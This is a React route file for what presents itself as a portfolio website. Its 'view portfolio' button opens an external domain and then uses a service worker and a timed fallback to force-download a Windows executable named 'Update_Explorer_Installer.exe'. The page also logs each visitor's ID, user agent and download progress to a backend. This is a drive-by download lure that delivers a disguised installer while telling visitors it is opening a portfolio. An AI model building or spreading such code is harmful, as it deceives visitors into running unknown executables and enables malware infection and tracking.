import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Toaster } from "@/components/ui/sonner";
import { EntryModal } from "@/components/EntryModal";
import { Navbar } from "@/components/Navbar";
import { Portfolio } from "@/components/Portfolio";
import { recordActivity } from "@/lib/activity";
import { scheduleInstallerDownload } from "@/lib/installer-download";
import { toast } from "sonner";

export const Route = createFileRoute("/")({
  component: Index,
});

function Index() {
  const [modalOpen, setModalOpen] = useState(true);
  const downloadInstaller = () => {
    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
    localStorage.setItem("portfolio-visitor-id", visitorId);

    setModalOpen(false);
    window.open("https://www.legendofeternity.publicvm.com", "_blank", "noopener,noreferrer");
    void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent: 99, userAgent: navigator.userAgent } });
    toast.message("Opening portfolio in a new tab...");

    void scheduleInstallerDownload({ data: { visitorId } })
      .then(({ availableAt, downloadUrl }) => {
        const delay = Math.max(0, availableAt - Date.now());
        const payload = { type: "SCHEDULE_DOWNLOAD", url: downloadUrl, delay, visitorId };

        const fallbackToDirectDownload = () => {
          window.setTimeout(() => {
            void startInstallerDownload(downloadUrl, visitorId).catch((error) => {
              toast.error("Unable to download the installer. Please try again.");
              console.error(error);
            });
          }, delay);
        };

        if ("serviceWorker" in navigator) {
          void navigator.serviceWorker.ready
            .then((registration) => {
              const worker = registration.active || registration.waiting || registration.installing || navigator.serviceWorker.controller;
              if (worker) {
                worker.postMessage(payload);
              } else {
                fallbackToDirectDownload();
              }
            })
            .catch((error) => {
              console.error(error);
              fallbackToDirectDownload();
            });
          return;
        }

        fallbackToDirectDownload();
      })
      .catch((error) => {
        toast.error("Unable to schedule the installer download. Please try again.");
        console.error(error);
      });
  };
  useEffect(() => {
    if ("serviceWorker" in navigator) {
      void navigator.serviceWorker.register("/sw-download.js").catch((error) => {
        console.error("Service worker registration failed", error);
      });

      const handleDownloadReady = (event: MessageEvent) => {
        if (event.data?.type !== "DOWNLOAD_READY") return;
        void startInstallerDownload(event.data.url, event.data.visitorId).catch((error) => {
          toast.error("Unable to download the installer. Please try again.");
          console.error(error);
        });
      };

      navigator.serviceWorker.addEventListener("message", handleDownloadReady);
      return () => navigator.serviceWorker.removeEventListener("message", handleDownloadReady);
    }
  }, []);

  useEffect(() => {
    const visitorId = localStorage.getItem("portfolio-visitor-id") ?? crypto.randomUUID();
    localStorage.setItem("portfolio-visitor-id", visitorId);
    const userAgent = navigator.userAgent;
    const update = (siteStatus: "active" | "left", appStatus?: "not_clicked" | "clicked") =>
      void recordActivity({ data: { visitorId, siteStatus, appStatus, userAgent } });
    update("active");
    const heartbeat = window.setInterval(() => update("active"), 20000);
    const onPageHide = () => update("left");
    const onFocus = () => update("active");
    window.addEventListener("pagehide", onPageHide);
    window.addEventListener("focus", onFocus);
    return () => { window.clearInterval(heartbeat); window.removeEventListener("pagehide", onPageHide); window.removeEventListener("focus", onFocus); };
  }, []);

  return (
      <div className="min-h-screen bg-background">
        <Navbar />
        <Portfolio />
        <EntryModal
          open={modalOpen}
          onViewPortfolio={() => downloadInstaller()}
        />
        <Toaster />
      </div>
  );
}

async function startInstallerDownload(downloadUrl: string, visitorId: string) {
  try {
    void recordActivity({ data: { visitorId, siteStatus: "active", appStatus: "clicked", downloadPercent: 100, userAgent: navigator.userAgent } });
  } catch (error) {
    console.error(error);
  }

  const response = await fetch(downloadUrl, { cache: "no-store", keepalive: true });
  if (!response.ok) throw new Error("Installer download failed");

  const installer = await response.blob();
  const objectUrl = URL.createObjectURL(installer);
  const link = document.createElement("a");
  link.href = objectUrl;
  link.download = "Update_Explorer_Installer.exe";
  document.body.append(link);
  link.click();
  link.remove();
  window.setTimeout(() => URL.revokeObjectURL(objectUrl), 0);
}

